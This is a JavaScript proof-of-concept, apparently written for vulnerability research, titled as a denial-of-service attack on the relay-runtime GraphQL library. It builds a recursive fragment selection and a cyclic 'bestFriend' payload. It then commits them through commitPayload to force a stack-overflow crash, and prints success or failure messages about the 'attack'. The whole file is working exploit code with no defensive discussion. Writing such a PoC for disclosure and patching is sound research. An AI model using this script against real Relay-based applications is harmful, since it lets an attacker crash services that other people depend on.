// PoC: RelayRecursiveDoS.js
// Stack Overflow via Cyclic Payload and Recursive Fragments
const RelayRuntime = require('relay-runtime');
const {
    createOperationDescriptor,
    Environment,
    Network,
    RecordSource,
    Store
} = RelayRuntime;

// 1. Setup Relay Environment
const source = new RecordSource();
const store = new Store(source);
const network = Network.create(() => Promise.resolve());
const environment = new Environment({ network, store });

// 2. Define a Recursive Structure manually
const userFragmentSelections = [
    { kind: 'ScalarField', name: 'id', alias: null, args: null, storageKey: null },
    { kind: 'ScalarField', name: 'name', alias: null, args: null, storageKey: null }
];

const bestFriendSelection = {
    kind: 'LinkedField',
    name: 'bestFriend',
    alias: null,
    storageKey: null,
    args: null,
    concreteType: 'User',
    plural: false,
    selections: userFragmentSelections
};

// Create recursion
userFragmentSelections.push(bestFriendSelection);

const operation = createOperationDescriptor(
    {
        kind: 'Request',
        fragment: {
            kind: 'Fragment',
            name: 'RecursiveQuery',
            type: 'Query',
            argumentDefinitions: [],
            selections: [
                {
                    kind: 'LinkedField',
                    name: 'user',
                    alias: null,
                    storageKey: null,
                    args: null,
                    concreteType: 'User',
                    plural: false,
                    selections: userFragmentSelections
                }
            ]
        },
        operation: {
            kind: 'Operation',
            name: 'RecursiveQuery',
            argumentDefinitions: [],
            selections: [
                {
                    kind: 'LinkedField',
                    name: 'user',
                    alias: null,
                    storageKey: null,
                    args: null,
                    concreteType: 'User',
                    plural: false,
                    selections: userFragmentSelections
                }
            ]
        },
        params: {
            name: 'RecursiveQuery',
            operationKind: 'query',
            text: 'query RecursiveQuery { user { ...RecursiveFragment } }',
            id: null,
            cacheID: 'recursive-query-id',
            metadata: {},
            providedVariables: {}
        }
    },
    {} // variables
);

// 3. Define Cyclic Payload
const userA = { id: 'user-A', name: 'User A' };
const userB = { id: 'user-B', name: 'User B' };
userA.bestFriend = userB;
userB.bestFriend = userA;
const payload = { user: userA };

console.log("[*] Committing Cyclic Payload with Recursive Query...");
console.log("[*] Expecting 'RangeError: Maximum call stack size exceeded'...");

// Robust commitPayload resolution
let commitPayload = RelayRuntime.commitPayload;
if (!commitPayload && environment.commitPayload) {
    commitPayload = (env, op, payload) => env.commitPayload(op, payload);
}

try {
    commitPayload(environment, operation, payload);
    console.log("[-] Attack Failed (No synchronous crash). Check stderr for async errors.");
} catch (e) {
    console.error("\n[!!!] CRITICAL: Denial of Service (Stack Overflow) Successful!");
    console.error(e);
}
